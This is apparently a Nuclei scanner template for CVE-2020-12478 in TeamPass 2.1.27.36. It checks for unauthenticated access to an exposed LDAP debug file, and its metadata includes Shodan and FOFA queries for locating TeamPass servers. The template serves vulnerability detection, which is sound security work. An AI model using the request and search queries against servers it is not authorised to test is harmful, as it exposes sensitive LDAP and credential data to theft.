id: CVE-2020-12478

info:
  name: TeamPass 2.1.27.36 - Improper Authentication
  author: arafatansari
  severity: high
  description: |
    TeamPass 2.1.27.36 is susceptible to improper authentication. An attacker can retrieve files from the TeamPass web root, which may include backups or LDAP debug files, and therefore possibly obtain sensitive information, modify data, and/or execute unauthorized operations.
  impact: |
    An attacker can bypass authentication and gain unauthorized access to sensitive information.
  remediation: |
    Upgrade to a patched version of TeamPass or apply the recommended security patches.
  reference:
    - https://github.com/nilsteampassnet/TeamPass/issues/2764
    - https://nvd.nist.gov/vuln/detail/CVE-2020-12478
    - https://github.com/ARPSyndicate/cvemon
    - https://github.com/ARPSyndicate/kenzer-templates
    - https://github.com/StarCrossPortal/scalpel
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2020-12478
    cwe-id: CWE-306
    epss-score: 0.38993
    epss-percentile: 0.9714
    cpe: cpe:2.3:a:teampass:teampass:2.1.27.36:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: teampass
    product: teampass
    shodan-query: http.html:"teampass"
    fofa-query: body="teampass"
  tags: cve2020,cve,teampass,exposure,unauth,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/files/ldap.debug.txt"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'Get all LDAP params'

      - type: word
        part: header
        words:
          - "text/plain"

      - type: status
        status:
          - 200
# digest: 4b0a004830460221008c32fc83d7bff30e69de3db62006929eedeb0a6f15beef5ddd0b793592cdfad7022100edb270ac4947b340d55bf3b31698ff47475f655ab6662216714f617e9d2441c4:922c64590222798bb761d5b6d8e72950